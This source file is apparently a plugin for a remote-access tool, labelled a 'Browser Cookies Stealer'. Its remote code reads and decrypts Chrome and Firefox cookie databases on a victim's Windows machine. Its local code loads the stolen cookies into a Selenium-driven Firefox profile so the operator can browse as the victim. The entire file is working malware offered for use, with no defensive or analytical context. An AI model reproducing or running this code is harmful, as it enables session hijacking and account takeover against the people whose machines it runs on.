plugin_name = r"""cookieStealer"""
plugin_description = r"""Browser Cookies Stealer"""
r_source = r"""
import sqlite3
import win32crypt
import glob

cookies = {}

# Chrome Stealer
PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
connection = sqlite3.connect(PathName)
sessions = []
with connection:
    cursor = connection.cursor()
    v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
    values = v.fetchall()
    for info in values:
        host = info[0]
        name = info[1]
        value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
        creation = info[3],
        expires = info[4],
        payload = {
                'domain': host,
                'name': name,
                'value': value,
                'creation': creation[0],
                'expires': expires[0],
            }
        sessions.append(payload)
cookies['chrome'] = sessions
# Firefox Stealer
firefox_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
if firefox_cookie:
    firefox_cookie = firefox_cookie[0]
    connection = sqlite3.connect(firefox_cookie)
    sessions = []
    with connection:
        cursor = connection.cursor()
        v = cursor.execute('SELECT host,name,value, creationTime, expiry, name FROM moz_cookies')
        values = v.fetchall()
        for info in values:
            host = info[0]
            name = info[1]
            value = info[2]
            creation = info[3]
            expires = info[4]
            payload = {
                    'domain': host,
                    'name': name,
                    'value': value,
                    'creation': creation,
                    'expires': expires,
                }
            sessions.append(payload)

else:
    sessions = []
cookies['firefox'] = sessions
mprint = str(cookies)
"""
l_source = r"""
# Chrome Cookies Stealer
import ast
import threading
cookies = ast.literal_eval(mprint)
log('INITIALIZING FIREFOX...')
def start_session(browser, cookies, client_id, assets):
    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    import shutil
    import sqlite3
    import sys
    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{0}-{1}'.format(client_id, browser))
    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
    default_cookies_path = os.path.join(assets, 'cookieStealer', 'cookies.sqlite')
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    shutil.copy2(default_cookies_path, path_to_cookies)
    with sqlite3.connect(path_to_cookies) as connection:
        cursor = connection.cursor()
        for cookie in cookies:
            try:
                v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',
                (None,'.'.join(cookie['domain'].split('.')[-2:]),0,'', cookie['name'],cookie['value'],cookie['domain'], '/',cookie['expires'],'',cookie['creation'],'',''))
                connection.commit()
            except:
                pass
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)
    ready_html = 'file://'+os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'ready.html').replace('\\', '/')
    driver_chrome.get(ready_html)
threads = {}
for browser in cookies.keys():
    threads[browser] = threading.Thread(target=start_session, args=(browser, cookies[browser], client_id, assets))
    threads[browser].start()
    log('INJECT {} COOKIES AND START FIREFOX'.format(browser))
    log('PLEASE WAIT')
"""